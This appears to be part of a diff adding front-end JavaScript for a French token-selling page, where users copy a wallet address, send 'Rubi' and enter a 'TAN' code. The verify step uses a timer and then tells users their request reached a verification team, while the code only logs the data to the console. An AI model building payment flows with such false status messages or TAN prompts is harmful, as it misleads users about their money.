+                sumCountry.textContent = opt.textContent.trim();
+
+                pendingMsg.classList.remove('active');
+                txCodeInput.value = '';
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = '✅ VÉRIFIER LA TRANSACTION';
+
+                step1.style.display = 'none';
+                step2.classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+
+            // ========== COPIER ==========
+            copyBtn.addEventListener('click', function() {
+                const doCopy = () => {
+                    navigator.clipboard.writeText(WALLET_ADDRESS).then(() => {
+                        markCopied();
+                    }).catch(() => {
+                        const ta = document.createElement('textarea');
+                        ta.value = WALLET_ADDRESS;
+                        document.body.appendChild(ta);
+                        ta.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(ta);
+                        markCopied();
+                    });
+                };
+                const markCopied = () => {
+                    copyBtn.classList.add('copied');
+                    copyBtn.innerHTML = '✅ Copié !';
+                    showSuccess('Adresse copiée', 'L\'adresse de réception Rubi a été copiée dans votre presse-papiers.');
+                    setTimeout(() => {
+                        copyBtn.classList.remove('copied');
+                        copyBtn.innerHTML = '📋 Copier l\'adresse';
+                    }, 2000);
+                };
+                doCopy();
+            });
+
+            // ========== VÉRIFICATION (demande envoyée, pas de validation auto) ==========
+            verifyBtn.addEventListener('click', function() {
+                const code = txCodeInput.value.trim();
+
+                if (!code) {
+                    showWarning('Code TAN manquant', 'Veuillez renseigner votre <strong>code de transaction (TAN)</strong> reçu après votre transfert Rubi.');
+                    txCodeInput.focus();
+                    return;
+                }
+
+                if (code.length < 6) {
+                    showError('Code TAN invalide', 'Le code de transaction (TAN) saisi semble trop court. Vérifiez qu\'il est complet et réessayez.');
+                    txCodeInput.focus();
+                    return;
+                }
+
+                verifyBtn.disabled = true;
+                verifyBtn.innerHTML = '<span class="verif-spinner"></span> Envoi de la demande...';
+
+                setTimeout(() => {
+                    verifyBtn.innerHTML = '✅ VÉRIFIER LA TRANSACTION';
+                    verifyBtn.disabled = false;
+
+                    // Affichage du message "en attente"
+                    document.getElementById('pendingRubi').textContent = `${currentTx.rubi} RUBI`;
+                    document.getElementById('pendingAmount').textContent = formatLocal(currentTx.localAmount, currentTx.symbol);
+                    document.getElementById('pendingOperator').textContent = currentTx.operator;
+                    pendingMsg.classList.add('active');
+                    pendingMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+                    // Modal d'information : demande envoyée, pas encore validée
+                    showInfo(
+                        'Demande envoyée',
+                        `Votre demande de vente a bien été transmise à notre équipe de vérification.<br><br>
+                        <strong>Statut :</strong> Paiement en attente<br>
+                        <strong>Référence :</strong> ${currentTx.rubi} RUBI<br><br>
+                        Vous recevrez <strong>${formatLocal(currentTx.localAmount, currentTx.symbol)}</strong> sur votre compte <strong>${currentTx.operator}</strong> dès validation de votre transfert.`
+                    );
+
+                    // Log pour intégration backend / bot Telegram
+                    console.log('Nouvelle demande de vente à valider par le bot Telegram :', {
+                        ...currentTx,
+                        tan: code,
+                        wallet: WALLET_ADDRESS,
+                        status: 'EN_ATTENTE',
+                        timestamp: new Date().toISOString()
+                    });
+                }, 1800);
+            });
+
+            // ========== RETOUR ==========
+            backBtn.addEventListener('click', function() {
+                step2.classList.remove('active');
+                step1.style.display = 'block';
+                pendingMsg.classList.remove('active');
+                txCodeInput.value = '';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+
+            // ========== INIT ==========
+            updateOperators();
+            updateLocalAmount();
+            updateDialCode();
+        })();
+    </script>
+</body>
+</html>
